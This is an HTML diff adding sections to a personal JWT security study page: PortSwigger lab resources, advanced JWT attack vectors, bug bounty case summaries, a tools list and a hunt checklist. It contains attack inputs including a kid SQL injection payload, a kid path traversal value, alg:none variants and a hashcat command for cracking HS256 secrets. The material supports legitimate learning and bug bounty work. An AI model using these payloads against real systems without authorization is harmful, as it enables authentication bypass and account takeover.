+  <!-- PORTSWIGGER LABS -->
+  <section id="labs" class="section">
+    <div class="section-tag">LABS — PORTSWIGGER COMPLETE</div>
+    <h2 class="section-title">All JWT Labs — 8/8 ✓</h2>
+    <div id="labs-banner"></div>
+
+    <div class="labs-grid" id="labs-grid">
+      <!-- labs injected by JS -->
+    </div>
+
+    <div class="lab-resources">
+      <div class="lr-title">Practice Resources</div>
+      <div class="grid-2">
+        <a class="resource-link" href="https://portswigger.net/web-security/jwt" target="_blank">
+          <span>🎯</span> PortSwigger JWT Learning Path
+        </a>
+        <a class="resource-link" href="https://jwt.io" target="_blank">
+          <span>🔍</span> JWT Decoder — jwt.io
+        </a>
+        <a class="resource-link" href="https://github.com/ticarpi/jwt_tool" target="_blank">
+          <span>🛠</span> jwt_tool — automated testing
+        </a>
+        <a class="resource-link" href="https://github.com/silentsignal/rsa_sign2n" target="_blank">
+          <span>🐳</span> rsa_sign2n — key derivation
+        </a>
+        <a class="resource-link" href="https://infosecwriteups.com/cracking-jwts-a-bug-bounty-hunting-guide-part-7-the-final-p1-boss-7a8baf3cf085" target="_blank">
+          <span>📖</span> Algorithm Confusion — Final P1 Boss (write-up)
+        </a>
+        <a class="resource-link" href="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities" target="_blank">
+          <span>📖</span> Intigriti — Exploiting JWT Vulnerabilities
+        </a>
+        <a class="resource-link" href="https://infosecwriteups.com/how-i-found-a-jwt-token-vulnerability-that-led-to-full-account-takeover-a2b6385b7c5c" target="_blank">
+          <span>💰</span> Real Bounty: JWT → Full Account Takeover
+        </a>
+        <a class="resource-link" href="https://redsentry.com/resources/blog/jwt-vulnerabilities-list-2026-security-risks-mitigation-guide" target="_blank">
+          <span>📊</span> Red Sentry: JWT Risks 2026
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ADVANCED & CONTEXT -->
+  <section id="advanced" class="section">
+    <div class="section-tag">ADVANCED — LESS COMMON VECTORS</div>
+    <h2 class="section-title">Advanced & Context-Specific Attacks</h2>
+
+    <div class="grid-2" style="margin-bottom:20px">
+      <div class="attack-variant">
+        <div class="av-title">cty Header → XXE Injection</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// cty = content type of payload
+// If server processes XML content:</span>
+{ "alg":"HS256", "cty":"text/xml" }
+
+<span class="c-comment">// Payload becomes XML → trigger XXE
+// Only works if signature already bypassed</span>
+        </pre>
+        <div class="av-step">Advanced — combine with another bypass first</div>
+      </div>
+      <div class="attack-variant">
+        <div class="av-title">x5c Header → Certificate Chain Injection</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// x5c contains X.509 certificate chain
+// Server may use supplied cert to verify:</span>
+{ "alg":"RS256", "x5c": ["MIIB..."] }
+
+<span class="c-comment">// Inject self-signed cert chain
+// Server trusts it → forge tokens</span>
+        </pre>
+        <div class="av-step">Similar to jwk injection but via certificate</div>
+      </div>
+      <div class="attack-variant">
+        <div class="av-title">OAuth / SSO JWT Attacks</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// JWTs heavily used in OAuth flows
+// Watch for:</span>
+- id_token in OAuth callback URLs
+- access_token in localStorage
+- JWT in state parameter
+- Cross-tenant token reuse
+- aud claim not validated per-service
+        </pre>
+        <div class="av-step">Check every OAuth/SSO flow for JWT misuse</div>
+      </div>
+      <div class="attack-variant">
+        <div class="av-title">GraphQL / Mobile API JWTs</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// Modern apps: GraphQL, mobile APIs
+// Often use JWT with less scrutiny:</span>
+- Check Authorization header on every GQL query
+- Mobile apps may hardcode signing secrets
+- Decompile APK → find JWT secret in code
+- Check /api/graphql with modified tokens
+        </pre>
+        <div class="av-step">Extract JWT secret from mobile app decompile</div>
+      </div>
+    </div>
+
+    <div class="explainer-box">
+      <div class="eb-title">🔭 Out-of-Band Hunting Tips (from PDF Research)</div>
+      <div style="font-size:13px; color:var(--text2); margin-top:8px;">
+        <div style="margin-bottom:8px;">• <strong style="color:var(--text)">GitHub dorking:</strong> Search repos for JWT library usage + check CVE lists for that library version</div>
+        <div style="margin-bottom:8px;">• <strong style="color:var(--text)">Token Time Bomb paper (NDSS 2026):</strong> Systematically found JWT issues across Go, Java, Node.js libraries — check if target uses vulnerable lib versions</div>
+        <div style="margin-bottom:8px;">• <strong style="color:var(--text)">Default certificates:</strong> Some services use default/demo certs for JWT signing — check SentinelOne advisories (CVE-2025-41672)</div>
+        <div style="margin-bottom:8px;">• <strong style="color:var(--text)">Cloud APIs:</strong> JWT issues documented in AWS, GCP, Azure SDKs — check Red Sentry 2026 report</div>
+        <div>• <strong style="color:var(--text)">SPAs:</strong> Single-page apps store JWTs in localStorage — check browser devtools storage tab</div>
+      </div>
+    </div>
+
+    <div class="warn-box">⚠ CVE-2018-0114 (node-jose): jwk injection accepted from attacker header. CVE-2024-54150 + CVE-2024-37568: Algorithm confusion in production systems. CVE-2025-41672: Authentication bypass via default certs.</div>
+  </section>
+
+  <!-- REAL BUG BOUNTIES -->
+  <section id="real-bounties" class="section">
+    <div class="section-tag">REAL WORLD — BUG BOUNTY CASES</div>
+    <h2 class="section-title">Real Bug Bounty Reports</h2>
+
+    <div class="bounty-card">
+      <div class="bc-header">
+        <div class="bc-title">Token in URL → Full Account Takeover</div>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <p>Confirmation links included JWT in URL. Payload contained user email + <strong>plaintext password</strong>. Attacker decoded token, used credentials to login, changed password without old-password check.</p>
+      <div class="bc-footer">
+        <span class="bc-platform">HackerOne</span>
+        <span class="bc-lesson">Lesson: Never put sensitive data in JWTs or URLs</span>
+      </div>
+    </div>
+
+    <div class="bounty-card">
+      <div class="bc-header">
+        <div class="bc-title">Jitsi (8x8) — Symmetric Key Algorithm Bug</div>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <p>Prosody module accepted symmetric HS256 algorithms in an RS256 flow. Any party could create their own token with any key and gain access to protected rooms. Fix: remove HS256 support entirely.</p>
+      <div class="bc-footer">
+        <span class="bc-platform">GitHub Advisory</span>
+        <span class="bc-lesson">Lesson: Never support both HS256 + RS256 without strict algorithm enforcement</span>
+      </div>
+    </div>
+
+    <div class="bounty-card">
+      <div class="bc-header">
+        <div class="bc-title">Newspack — Missing Signature Validation</div>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <p>WordPress plugin omitted JWT signature validation on login/registration endpoints. Anyone could forge tokens with any claims and register or login as any user.</p>
+      <div class="bc-footer">
+        <span class="bc-platform">HackerOne</span>
+        <span class="bc-lesson">Lesson: Always use verify(), never decode() without verification</span>
+      </div>
+    </div>
+
+    <div class="bounty-card">
+      <div class="bc-header">
+        <div class="bc-title">Algorithm Confusion — No Private Key Needed</div>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <p>RS256 service exploited via HS256 confusion. Researcher fetched public key, switched alg, signed with public key as HMAC secret. Full admin access forged with no private key.</p>
+      <div class="bc-footer">
+        <span class="bc-platform">Bug Bounty Write-up</span>
+        <span class="bc-lesson">CVE-2024-54150, CVE-2024-37568</span>
+      </div>
+    </div>
+
+    <div class="payout-table-wrap">
+      <div class="pt-title">Typical Payout Ranges</div>
+      <table class="ptable">
+        <thead><tr><th>Vulnerability</th><th>Severity</th><th>Typical Range</th></tr></thead>
+        <tbody>
+          <tr><td>Token in URL / No expiry</td><td><span class="badge badge-low">Low</span></td><td class="c-green">$200 – $800</td></tr>
+          <tr><td>Weak HS256 secret (brute-forced)</td><td><span class="badge badge-medium">Medium</span></td><td class="c-green">$1,000 – $5,000</td></tr>
+          <tr><td>Algorithm confusion</td><td><span class="badge badge-high">High</span></td><td class="c-green">$3,000 – $15,000</td></tr>
+          <tr><td>JKU / kid injection</td><td><span class="badge badge-critical">Critical</span></td><td class="c-green">$5,000 – $25,000+</td></tr>
+          <tr><td>Full auth bypass (alg:none)</td><td><span class="badge badge-critical">Critical</span></td><td class="c-green">$10,000 – $50,000+</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- TOOLS -->
+  <section id="tools" class="section">
+    <div class="section-tag">TOOLS & RESOURCES</div>
+    <h2 class="section-title">Your JWT Toolkit</h2>
+
+    <div class="tools-grid">
+      <div class="tool-card">
+        <div class="tc-icon">🔬</div>
+        <div class="tc-name">Burp Suite</div>
+        <div class="tc-cost free">FREE</div>
+        <p>Main proxy. Intercept, modify, replay JWT requests. JWT Editor extension adds dedicated JWT tab.</p>
+        <code>portswigger.net/burp</code>
+      </div>
+      <div class="tool-card">
+        <div class="tc-icon">🧩</div>
+        <div class="tc-name">JWT Editor (Burp ext)</div>
+        <div class="tc-cost free">FREE</div>
+        <p>Install from BApp Store. Gives RSA/HMAC key generation, signing, embedded attack shortcuts.</p>
+        <code>Burp → Extensions → BApp Store</code>
+      </div>
+      <div class="tool-card">
+        <div class="tc-icon">🔍</div>
+        <div class="tc-name">jwt.io</div>
+        <div class="tc-cost free">FREE</div>
+        <p>Browser-based decoder. Paste any JWT → instantly see header + payload. Great for quick inspection.</p>
+        <code>jwt.io</code>
+      </div>
+      <div class="tool-card">
+        <div class="tc-icon">💥</div>
+        <div class="tc-name">Hashcat</div>
+        <div class="tc-cost free">FREE</div>
+        <p>Brute-force HS256 secrets using wordlists. Use with rockyou.txt for common secrets.</p>
+        <code>hashcat -a 0 -m 16500 jwt.txt rockyou.txt</code>
+      </div>
+      <div class="tool-card">
+        <div class="tc-icon">🐍</div>
+        <div class="tc-name">jwt_tool</div>
+        <div class="tc-cost free">FREE</div>
+        <p>Python CLI. Automates most JWT attacks: none, confusion, brute force, injection tests.</p>
+        <code>github.com/ticarpi/jwt_tool</code>
+      </div>
+      <div class="tool-card">
+        <div class="tc-icon">🐳</div>
+        <div class="tc-name">sig2n (Docker)</div>
+        <div class="tc-cost free">FREE</div>
+        <p>Derives public key from 2 JWTs. Needed for expert-level algorithm confusion with no exposed key.</p>
+        <code>docker run --rm -it portswigger/sig2n t1 t2</code>
+      </div>
+    </div>
+  </section>
+
+  <!-- HUNT CHECKLIST -->
+  <section id="checklist" class="section">
+    <div class="section-tag">HUNT CHECKLIST — INTERACTIVE</div>
+    <h2 class="section-title">JWT Bug Hunting Checklist</h2>
+    <p class="section-sub">Click items to mark as tested. Progress saves in browser.</p>
+
+    <div class="checklist-progress">
+      <div class="cp-bar"><div class="cp-fill" id="cp-fill"></div></div>
+      <span class="cp-label" id="cp-label">0 / 0 checked</span>
+    </div>
+
+    <div class="checklist-group">
+      <div class="cg-title">🔍 Recon</div>
+      <div class="check-item" data-id="c1" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Find JWT tokens — check Authorization headers, cookies, localStorage, URL params</div>
+      </div>
+      <div class="check-item" data-id="c2" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Visit <code>/jwks.json</code> and <code>/.well-known/jwks.json</code> — note if public key exposed</div>
+      </div>
+      <div class="check-item" data-id="c3" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Decode JWT at jwt.io — inspect all header fields: alg, kid, jku, jwk, x5c</div>
+      </div>
+      <div class="check-item" data-id="c4" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Inspect payload — check for roles, sensitive data, exp, iss, aud claims</div>
+      </div>
+    </div>
+
+    <div class="checklist-group">
+      <div class="cg-title">💣 Signature Attacks</div>
+      <div class="check-item" data-id="c5" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Test <code>alg: none</code> — try "none", "None", "NONE", "nOnE" variants</div>
+      </div>
+      <div class="check-item" data-id="c6" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Remove signature entirely — send <code>header.payload.</code> (trailing dot)</div>
+      </div>
+      <div class="check-item" data-id="c7" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">If HS256 — brute force secret with hashcat + rockyou.txt</div>
+      </div>
+      <div class="check-item" data-id="c8" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">If RS256 + jwks.json exists — try algorithm confusion (RS256→HS256)</div>
+      </div>
+      <div class="check-item" data-id="c9" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">If RS256 + no jwks.json — collect 2 tokens → run sig2n → derive key → algo confusion</div>
+      </div>
+    </div>
+
+    <div class="checklist-group">
+      <div class="cg-title">🔑 Header Injection</div>
+      <div class="check-item" data-id="c10" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Test embedded JWK injection — Burp JWT Editor → Attack → Embedded JWK</div>
+      </div>
+      <div class="check-item" data-id="c11" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Test JKU injection — add <code>jku</code> pointing to exploit server with your public key</div>
+      </div>
+      <div class="check-item" data-id="c12" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Test kid path traversal — try <code>../../dev/null</code> and sign with empty string</div>
+      </div>
+      <div class="check-item" data-id="c13" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Test kid SQL injection — try <code>x' UNION SELECT 'secret'--</code></div>
+      </div>
+    </div>
+
+    <div class="checklist-group">
+      <div class="cg-title">📋 Claim & Logic Tests</div>
+      <div class="check-item" data-id="c14" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Change <code>sub</code> to another user ID — is authorization enforced server-side?</div>
+      </div>
+      <div class="check-item" data-id="c15" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Change <code>role</code> / <code>isAdmin</code> to elevated value — server re-validate?</div>
+      </div>
+      <div class="check-item" data-id="c16" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Remove or modify <code>exp</code> — does server validate expiry?</div>
+      </div>
+      <div class="check-item" data-id="c17" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Test old token after logout — still valid? (no revocation)</div>
+      </div>
+      <div class="check-item" data-id="c18" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Modify <code>iss</code> / <code>aud</code> — cross-service token usage?</div>
+      </div>
+      <div class="check-item" data-id="c19" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Check if JWT appears in URL, Referer header, or server logs</div>
+      </div>
+      <div class="check-item" data-id="c20" onclick="toggleCheck(this)">
+        <div class="ci-box"></div>
+        <div class="ci-text">Check payload for sensitive data (passwords, keys, internal IDs)</div>
+      </div>
+    </div>
+
+    <div class="checklist-actions">
+      <button class="action-btn" onclick="checkAll()">Check All</button>
+      <button class="action-btn btn-outline" onclick="clearAll()">Clear All</button>
+    </div>
+  </section>
+
+  <!-- MY NOTES -->
+  <section id="notes" class="section">
+    <div class="section-tag">MY NOTES — EDITABLE</div>
+    <h2 class="section-title">Personal Notes</h2>
+    <p class="section-sub">Your notes save automatically in browser storage. Edit anytime.</p>
+
+    <div class="notes-toolbar">
+      <button class="note-action" onclick="addNote()">+ New Note</button>
+      <button class="note-action btn-outline" onclick="exportNotes()">↓ Export</button>
+    </div>
+
+    <div id="notes-container">
+      <!-- Notes injected by JS -->
+    </div>
+  </section>
+
+  <!-- JWT DECODER -->
+  <section id="decoder" class="section">
+    <div class="section-tag">JWT DECODER — BUILT-IN TOOL</div>
+    <h2 class="section-title">Decode Any JWT</h2>
+    <p class="section-sub">Paste a JWT token below — header, payload, and signature info shown instantly.</p>
+
+    <div class="decoder-wrap">
+      <textarea id="decoder-input" class="decoder-input" placeholder="eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIiLCJleHAiOjE3NzQzNjc1MDl9.SflKxwRJSMe..."></textarea>
+      <div class="decoder-actions">
+        <button class="action-btn" onclick="decodeJWT()">Decode</button>
+        <button class="action-btn btn-outline" onclick="clearDecoder()">Clear</button>
+      </div>
+
+      <div id="decoder-output" class="decoder-output" style="display:none">
+        <div class="do-section">
+          <div class="do-label">HEADER</div>
+          <pre id="do-header" class="code-block"></pre>
+          <div id="header-warnings" class="decoder-warnings"></div>
+        </div>
+        <div class="do-section">
+          <div class="do-label">PAYLOAD</div>
+          <pre id="do-payload" class="code-block"></pre>
+          <div id="payload-warnings" class="decoder-warnings"></div>
+        </div>
+        <div class="do-section">
+          <div class="do-label">SIGNATURE</div>
+          <pre id="do-sig" class="code-block"></pre>
+        </div>
+        <div id="decoder-findings" class="decoder-findings"></div>
+      </div>
+      <div id="decoder-error" class="decoder-error" style="display:none"></div>
+    </div>
+  </section>
+
+</main>
+
+<script src="app.js"></script>
+</body>
+</html>
